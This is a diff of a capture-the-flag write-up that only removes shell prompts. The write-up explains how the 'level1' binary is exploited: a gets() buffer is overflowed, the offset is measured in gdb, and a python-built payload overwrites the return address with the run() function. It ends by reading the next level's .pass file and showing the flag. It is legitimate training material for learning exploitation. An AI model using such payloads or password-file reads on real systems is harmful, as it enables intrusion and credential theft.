@@ -21,14 +21,14 @@ By examining the man page for the gets() function, it can see that this function
 We try to do a buffer overflow by inputting a string exceeding 100 characters:
 
 ```
-$ ./level1
+./level1
 letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42
 Segmentation fault (core dumped)
 ```
 
 This confirmed the presence of a buffer overflow. Next, we determined the buffer size using gdb:
 ```
-$ gdb ./level1
+gdb ./level1
 (gdb) disass main
 ```
 We found that the buffer size is 0x50, or 80 bytes.
@@ -55,8 +55,8 @@ We then examined all functions in the program with `info functions` and identifi
 ```
 To exploit the program, we generated a string of 76 characters followed by the address of the `run` function (0x08048444) in little-endian format (\x44\x84\x04\x08):
 ```
-$ python -c "print('-' * 76 + '\x44\x84\x04\x08')" > /tmp/test
-$ cat /tmp/test - | ./level1
-$ cat /home/user/level2/.pass
+python -c "print('-' * 76 + '\x44\x84\x04\x08')" > /tmp/test
+cat /tmp/test - | ./level1
+cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
